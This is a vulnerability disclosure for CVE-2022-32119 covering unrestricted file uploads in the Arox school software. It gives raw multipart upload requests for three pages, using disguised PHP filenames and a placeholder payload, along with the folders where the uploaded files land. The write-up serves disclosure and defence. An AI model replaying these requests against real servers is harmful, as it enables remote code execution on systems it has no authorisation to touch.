# CVE-2022-32119 - Arox-Unrestricted-File-Upload

There are multiple unrestricted file uploads that result in the arbitrary execution of PHP code.

## Authenticated Vulnerable Pages:


#### localhost/office_admin/?pid=54&action=add

```

-----------------------------181967832439954202373233921976

Content-Disposition: form-data; name="apid"



2

-----------------------------181967832439954202373233921976

Content-Disposition: form-data; name="title"



Test

-----------------------------181967832439954202373233921976

Content-Disposition: form-data; name="image_path"; filename="phpfilehere.php.jpg"

Content-Type: image/jpeg



<PHP Code Here>

-----------------------------181967832439954202373233921976

Content-Disposition: form-data; name="addphoto"



Add

-----------------------------181967832439954202373233921976--

  
File location: localhost/office_admin/images/student_photos/<file here>

```


  
#### localhost/office_admin/?pid=22&action=school_details

```

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_startdate"



06/04/2022

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_enddate"



07/04/2022

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_ac_startdate"



06/04/2022

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_ac_enddate"



07/04/2022

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_schoolname"



Test

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_currency"



Test

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_symbol"



test

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_address"



Test

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_endclass"





-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_email"



info@test.com

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_phoneno"



1234567899

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_website"



www.test.com

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="fi_school_logo"; filename="phpfilehere.php"

Content-Type: image/jpeg



<PHP Code Here>

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="oldlogoimage"



oldimage.jpg

-----------------------------11158482814295139764067111151

Content-Disposition: form-data; name="Submit"



Submit

-----------------------------11158482814295139764067111151--


File location: localhost/office_admin/images/school_logo/<file here>

```


## Unauthenticated Vulnerable Pages:

#### localhost/greatbritain/greatbritain/upload_stafffille.php

```

-----------------------------80149291128776956634294289925

Content-Disposition: form-data; name="txtdocname"; filename="test.jpg"

Content-Type: image/jpeg



123456

-----------------------------80149291128776956634294289925

Content-Disposition: form-data; name="btnsubmit"



Submit

-----------------------------80149291128776956634294289925--


File location: localhost/greatbritain/greatbritain/upload_data/<file here>

```
